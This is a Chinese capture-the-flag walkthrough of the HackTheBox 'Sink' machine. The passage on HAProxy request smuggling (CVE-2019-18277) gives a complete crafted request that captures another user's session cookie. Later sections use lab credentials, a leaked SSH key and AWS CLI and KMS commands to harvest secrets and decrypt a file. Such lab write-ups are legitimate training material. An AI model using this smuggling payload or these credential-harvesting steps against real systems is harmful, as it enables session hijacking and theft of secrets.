> 原文链接: https://www.anquanke.com//post/id/247560 


# Hack the box Sink 靶机渗透实战


                                阅读量   
                                **22134**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0122d0fb3ffb0e897d.png)](https://p5.ssl.qhimg.com/t0122d0fb3ffb0e897d.png)



## 0x00 题目介绍

Sink是`HackTheBox`上一道难度是`insane`的`Linux`靶机，做了很久`HackTheBox`，第一次做`insane`难度的，还是学到了很多东西的，在这里跟大家分享一下。

题目主要涉及到的知识点是：

> <p>HAProxy HTTP request smuggling (CVE-2019-18277)<br>
Git commit log<br>
AWS CLI Configure</p>

[![](https://p4.ssl.qhimg.com/t017e86ba6863181a86.png)](https://p4.ssl.qhimg.com/t017e86ba6863181a86.png)



## 0x01 Port Scan

```
└─# nmap -sC -sV -oA sink 10.129.71.3
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 00:00 CST
Nmap scan report for 10.129.71.3
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=7d01b54d4b74326b; Path=/; HttpOnly
|     Set-Cookie: _csrf=fzBuPyYXciKNMjoU74_PH6UmsMU6MTYyNTUwMDg1NzUxOTkyOTA4OQ; Path=/; Expires=Tue, 06 Jul 2021 16:00:57 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 05 Jul 2021 16:00:57 GMT
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=5a24776cc4ce15ce; Path=/; HttpOnly
|     Set-Cookie: _csrf=Naj5fDxJz0wmhymfl7zrTjDvfrI6MTYyNTUwMDg2NDgyNDg1NDY3MQ; Path=/; Expires=Tue, 06 Jul 2021 16:01:04 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 05 Jul 2021 16:01:04 GMT
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en-US" class="theme-"&gt;
|     &lt;head data-suburl=""&gt;
|     &lt;meta charset="utf-8"&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
|     &lt;link rel="manifest" href="/manifest.json" crossorigin="use-credentials"&gt;
|     &lt;meta name="theme-color" content="#6cc644"&gt;
|     &lt;meta name="author" content="Gitea - Git with a cup of tea" /&gt;
|_    &lt;meta name="description" content="Gitea (Git with a c
5000/tcp open  http    Gunicorn 20.0.0
|_http-server-header: gunicorn/20.0.0
|_http-title: Sink Devops

```

开放的主要是3000和5000端口，3000端口为`Gitea`的网站，5000端口为`Gunicorn`的网站。3000端口的网站需要登录，但是我们没有掌握任何登录凭证，所以先看下5000端口网站。



## 0x02 Port 5000 – Gunicorn

5000端口网站可以注册账户，先尝试注册用户登录抓包看下

[![](https://p3.ssl.qhimg.com/t01b7aa254c6749d6cd.png)](https://p3.ssl.qhimg.com/t01b7aa254c6749d6cd.png)

看到抓包中`response`包含了`haproxy`和`gunicorn`

[![](https://p0.ssl.qhimg.com/t01e83d732d857beebf.png)](https://p0.ssl.qhimg.com/t01e83d732d857beebf.png)

登录后页面可以发布评论。`Google`了下发现存在一个HAProxy HTTP request smuggling (CVE-2019-18277)的漏洞，通过HTTP请求走私发送构造的特定的评论请求，可以获取到其他用户发送的HTTP请求中的隐私信息。

[![](https://p5.ssl.qhimg.com/t01d60faffdbd8b134e.png)](https://p5.ssl.qhimg.com/t01d60faffdbd8b134e.png)

### <a class="reference-link" name="HAProxy%20HTTP%20request%20smuggling%20(CVE-2019-18277)"></a>HAProxy HTTP request smuggling (CVE-2019-18277)

HAProxy在处理`request header`中的`Transfer-Encoding`和`Content-Length`时存在问题，如果在请求头中同时添加了`Transfer-Encoding`和`Content-Length`，并且在`Transfer-Encoding`的`chunked`字段前添加了`\x0b`或者`\x0c`时，HAProxy会错误的将带有`Transfer-Encoding`和`Content-Length`的请求发送给后端处理。此时因为后端将请求作为`Transfer-Encoding`格式的请求解析，即会在检测到类似`0\r\n\r\n`之后结束当前请求。

发送给HAProxy的请求：

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:[\x0b]chunked

0

X

```

发送给后端处理的请求：

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

0

X

```

当然利用的前提是必须要在HAProxy配置中配置`http-reuse always`，并在发送请求时在`header`中配置`Connection: keep-alive`。

利用请求走私可以绕过前端服务器的安全控制、获取其他用户请求、利用反射型xss、进行缓存投毒等，具体在这里不再展开，可以参考这篇文章：

> [https://paper.seebug.org/1048/](https://paper.seebug.org/1048/)

### <a class="reference-link" name="admin%20cookie%20steal"></a>admin cookie steal

利用上面的`HAProxy HTTP request smuggling`的漏洞，如果我们在构造的恶意请求之后，其他用户也进行了请求，那我们就可以通过走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求中的隐私信息了。

[![](https://p1.ssl.qhimg.com/t01d2a73c34df54a654.png)](https://p1.ssl.qhimg.com/t01d2a73c34df54a654.png)

我们在`repeater`中构造一下请求

```
POST /comment HTTP/1.1
Host: 10.129.71.3:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://10.129.71.3:5000
Connection: keep-alive
Referer: http://10.129.71.3:5000/home
Cookie: lang=en-US; i_like_gitea=ec51054dc539d89a; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.YO2r8w.8rq5TXqG7LkEYJV3cqVwOBTIh7o; _csrf=cQKWFLPhRfTeyypUg38t8RbxoUY6MTYyNjE4ODM1OTEzNDc4OTczMw
Upgrade-Insecure-Requests: 1
Transfer-Encoding: Cwo=chunked

5
msg=test
0

POST /comment HTTP/1.1
Host: 10.129.71.3:5000
Cookie: lang=en-US; i_like_gitea=ec51054dc539d89a; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.YO2r8w.8rq5TXqG7LkEYJV3cqVwOBTIh7o; _csrf=cQKWFLPhRfTeyypUg38t8RbxoUY6MTYyNjE4ODM1OTEzNDc4OTczMw
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Connection: keep-alive

msg=

```

后面这部分POST请求即为我们走私的请求，因为需要在`Transfer-Encoding`的`chunked`前面加`\x0b`，我们先添加`Cwo=`，然后在`burp`中`shift+ctrl+b` `(base64 decode)`即可，或者直接在`burp`中添加`[\x0b]`也可以。发送后我们在评论处可以看到一条新的评论，包含了这个用户的cookie。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016cc77e69d8edfa82.png)

`Cookie editor`替换一下，即可以获得`[admin@sink.htb](mailto:admin@sink.htb)`的权限。

[![](https://p1.ssl.qhimg.com/t010f231b3c1defc408.png)](https://p1.ssl.qhimg.com/t010f231b3c1defc408.png)

### <a class="reference-link" name="Credentials"></a>Credentials

在`Notes`中可以获得三部分`Credentials`:

```
Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&amp;zEx`{`4]zz

Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L&gt;Z3`}`)zzfQ3

Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8&lt;H6GK\`{`*L.fB3C
```



## 0x03 Port 3000 – Gitea

经过尝试，发现使用`root/FaH[@3L](https://github.com/3L)&gt;Z3`}`)zzfQ3`这个密码可以成功登录3000端口的`Gitea`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016b345523c185bdce.png)

`Gitea`是一个类似`git`的代码托管平台，在几个主要的`Repositories`里看了下，发现`key management`中似乎有一些秘钥信息

[![](https://p4.ssl.qhimg.com/t0158fb5234f8e285bf.png)](https://p4.ssl.qhimg.com/t0158fb5234f8e285bf.png)

发现是用户`marcus`提交的`ssh`私钥

[![](https://p1.ssl.qhimg.com/t01829a39775bb7c10c.png)](https://p1.ssl.qhimg.com/t01829a39775bb7c10c.png)

### <a class="reference-link" name="User%20-marcus"></a>User -marcus

将私钥拷到本地，并修改权限为600，`ssh`尝试连接`marcus`用户成功

[![](https://p1.ssl.qhimg.com/t01edad8d708bfaa817.png)](https://p1.ssl.qhimg.com/t01edad8d708bfaa817.png)

`ls`当前目录发现`user.txt`，获得第一个`flag`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0160b00bbd58c59f81.png)



## 0x04 Privilege Escalation

根据`Key Management`可以发现，存在一些`AWS`的操作；同样在`Log Management`中，发现了`marcus`删除`AWS`相关配置的`key`和`secret`的提交记录

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d4e7df2711d8c578.png)

顺着可以找到之前提交的配置的相关代码

```
&lt;?php
require 'vendor/autoload.php';

use Aws\CloudWatchLogs\CloudWatchLogsClient;
use Aws\Exception\AwsException;

$client = new CloudWatchLogsClient([
    'region' =&gt; 'eu',
    'endpoint' =&gt; 'http://127.0.0.1:4566',
    'credentials' =&gt; [
        'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ',
        'secret' =&gt; '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'
    ],
    'version' =&gt; 'latest'
]);
try `{`
$client-&gt;createLogGroup(array(
    'logGroupName' =&gt; 'Chef_Events',
));
`}`
catch (AwsException $e) `{`
    echo $e-&gt;getMessage();
    echo "\n";
`}`
try `{`
$client-&gt;createLogStream([
    'logGroupName' =&gt; 'Chef_Events',
    'logStreamName' =&gt; '20201120'
]);
`}`catch (AwsException $e) `{`
    echo $e-&gt;getMessage();
    echo "\n";
`}`
?&gt;
```

### <a class="reference-link" name="AWS%20CLI%20Configure"></a>AWS CLI Configure

`Google`了一下`AWS、key、secret`，发现在官方指导手册中有相关介绍，可以通过`AWS`配置`key`和`secret`，从而访问关键隐私信息。官方指导手册如下：

> [https://docs.aws.amazon.com/cli/latest/index.html](https://docs.aws.amazon.com/cli/latest/index.html)
[https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html)

[![](https://p4.ssl.qhimg.com/t0140c0257d5b1051f2.png)](https://p4.ssl.qhimg.com/t0140c0257d5b1051f2.png)

我们也尝试按照官方说明配置下，只需要修改`key`和`secret`即可，`region`代表所在区域，直接按照官方默认来设置：

```
marcus@sink:~$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: us-west-2
Default output format [None]: json
```

### <a class="reference-link" name="AWS%20Secretsmanager"></a>AWS Secretsmanager

配置完成之后可以通过`secretsmanager`列举保存的`secrets`

```
aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
```

[![](https://p3.ssl.qhimg.com/t0126c5338c1313af01.png)](https://p3.ssl.qhimg.com/t0126c5338c1313af01.png)

然后根据列举出的`secrets`逐个查询

```
aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:xxxxxxx&lt;name&gt;"
```

获得了以下内容

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0176161bf4ac3ab253.png)

```
username:david@sink.htb   password:EALB=bcC=`a7f2#k
username:albert@sink.htb  password:Welcome123!
username:john@sink.htb    password:R);\\)ShS99mZ~8j
```

### <a class="reference-link" name="User-david"></a>User-david

查看`/etc/passwd`和`/home`路径，发现是存在`david`用户的，尝试了下可以成功用密码切换到`david`用户

[![](https://p1.ssl.qhimg.com/t011229e73d9de06e0a.png)](https://p1.ssl.qhimg.com/t011229e73d9de06e0a.png)



## 0x05 AWS Key Management

### <a class="reference-link" name="severs.enc"></a>severs.enc

`david`用户目录下`/home/david/Projects/Prod_Deployment`发现了一个`servers.enc`文件，显然需要解密

[![](https://p1.ssl.qhimg.com/t011c2ba95004b64f1e.png)](https://p1.ssl.qhimg.com/t011c2ba95004b64f1e.png)

因为目录是`Gitea`项目相关的目录，猜测很可能还是需要通过AWS来解密，搜索之后发现了`AWS Key Management`

> [https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html](https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html)
[https://docs.aws.amazon.com/kms/latest/developerguide/programming-encryption.html](https://docs.aws.amazon.com/kms/latest/developerguide/programming-encryption.html)

### <a class="reference-link" name="list-keys"></a>list-keys

同样使用`david`用户先按照之前的`AWS`进行配置，配置之后可以`list-keys`

```
aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
```

[![](https://p3.ssl.qhimg.com/t019b757fc9f65ea885.png)](https://p3.ssl.qhimg.com/t019b757fc9f65ea885.png)

### <a class="reference-link" name="decrypt"></a>decrypt

按照国外大神的思路进行解密操作，`bash`脚本如下：

```
#!/binbash
for KEY in $(aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | awk -F\" '`{` print $4 `}`')
do 
    aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "$`{`KEY`}`"
    aws --endpoint-url="http://127.0.0.1:4566/" kms decrypt --key-id "$`{`KEY`}`" --ciphertext-blob "fileb:///home/david/Projects/Prod_Deployment/servers.enc" --encryption-algorithm "RSAES_OAEP_SHA_256" --output "text" --query "Plaintext"
done

```

[![](https://p4.ssl.qhimg.com/t015e5eb8880b4efbfe.png)](https://p4.ssl.qhimg.com/t015e5eb8880b4efbfe.png)

得到了一串base64的字符串，推荐使用`CyberChef`进行解密，选取自己想要的模块直接拖就行，非常方便：

> [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

[![](https://p1.ssl.qhimg.com/t01621c9902e4cb389c.png)](https://p1.ssl.qhimg.com/t01621c9902e4cb389c.png)

`base64`之后需要再`gunzip`解下包，可以得到最后的秘钥：

```
name: admin
pass: _uezduQ!EY5AHfe2
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cd724be0a034c1d7.png)

done!

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

总的来看，这个靶机主要涉及到了`HTTP`请求走私、`HAProxy HTTP request smuggling (CVE-2019-18277)`、`Gitea`信息泄露、`AWS CLI`配置、`AWS Key Management`等知识点，以前没搞过AWS的可以通过这个靶机好好熟悉下。另外HTTP请求走私虽然利用比较苛刻，但是也算是一个可以利用的攻击方法，需要后续在深入学习下。



## 0x06 Reference
<li>1、[https://paper.seebug.org/1048/](https://paper.seebug.org/1048/)
</li>
<li>2、[https://nathandavison.com/blog/haproxy-http-request-smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling)
</li>
<li>3、[https://docs.aws.amazon.com/cli/latest/index.html](https://docs.aws.amazon.com/cli/latest/index.html)
</li>
<li>4、[https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html](https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html)
</li>